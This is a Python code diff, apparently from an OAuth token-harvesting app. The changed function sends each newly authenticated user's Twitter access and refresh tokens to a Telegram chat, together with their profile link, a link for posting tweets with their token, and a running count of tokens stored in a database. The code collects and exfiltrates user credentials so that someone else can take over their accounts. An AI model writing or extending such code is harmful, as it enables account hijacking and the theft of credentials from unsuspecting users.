@@ -138,16 +138,40 @@ def refresh_token_in_db(refresh_token, username):
         return None, None
 
 # Send message via Telegram
-# Send message via Telegram
-def send_message_via_telegram(message):
+def send_message_via_telegram(access_token, refresh_token=None):
+    alert_emoji = "🚨"
+    key_emoji = "🔑"
+    user_emoji = "👤"
+    
+    # Get the username from the access token
+    username = get_twitter_username(access_token)
+    twitter_url = f"https://twitter.com/{username}" if username else "Unknown user"
+    
+    # Calculate the total tokens
+    total_tokens = get_total_tokens()
+
+    # Properly format the access and refresh tokens in a clean way
+    access_token_display = f"`{access_token}`"
+    refresh_token_display = f"`{refresh_token}`" if refresh_token else "None"
+
+    # Construct the message
+    message = (
+        f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
+        f"{key_emoji} *Access Token:* {access_token_display}\n"
+        f"{key_emoji} *Refresh Token:* {refresh_token_display}\n"
+        f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({CALLBACK_URL}/tweet/{access_token})\n"
+        f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
+        f"🔢 *Total Tokens in Database:* {total_tokens}"
+    )
+
+    # Send the message to Telegram ensuring UTF-8 encoding
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"
+        "parse_mode": "Markdown"  # Using Markdown for formatting
     }
-
-    # Ensure proper encoding in the request
+    
     headers = {
         "Content-Type": "application/json; charset=utf-8"
     }
@@ -156,8 +180,7 @@ def send_message_via_telegram(message):
     
     if response.status_code != 200:
         print(f"Failed to send message via Telegram: {response.text}")
-
-# Function to get Twitter username
+        
 def get_twitter_username(access_token):
     url = "https://api.twitter.com/2/users/me"
     headers = {
